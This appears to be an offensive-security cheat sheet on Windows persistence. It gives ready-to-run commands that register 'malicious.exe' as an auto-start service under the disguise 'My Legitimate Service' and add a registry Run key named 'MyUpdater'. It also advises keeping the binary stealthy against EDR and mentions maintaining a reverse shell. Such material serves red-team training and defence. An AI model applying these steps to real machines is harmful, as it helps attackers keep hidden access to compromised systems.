Windows Persistence

Windows Services & Registry Run Keys

Background Execution and Logon Autostart

# Create a new service for 'malicious.exe'
sc create MyMaliciousService binPath="C:\ProgramData\malicious.exe" start= auto DisplayName= "My Legitimate Service"
# binPath: Path to your executable
# start= auto: Starts automatically at boot
# DisplayName: Appears in Services Manager

# Start the service
sc start MyMaliciousService

# Add an entry to run malicious.exe at logon for the current user
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyUpdater" -Value "C:\ProgramData\malicious.exe"
# HKCU: Current User | HKLM: Local Machine (all users)
# -Name: The name of the registry entry
# -Value: The command to execute
  • •**Windows Services:** Run in background, often with SYSTEM privileges.
  • •**Registry Run Keys:** Automatically launch programs at user logon or system startup.
Safety Note

Creating services can be noisy and easily detected by EDRs. Ensure your service binary is highly stealthy and its behavior is benign.

Example Use

A service can maintain a reverse shell, while a registry run key can re-establish access if a user logs in, even after a reboot.

Key Takeaway

Services offer robust, high-privilege background persistence, while registry run keys provide simpler, user-session-dependent autostart capabilities on Windows.
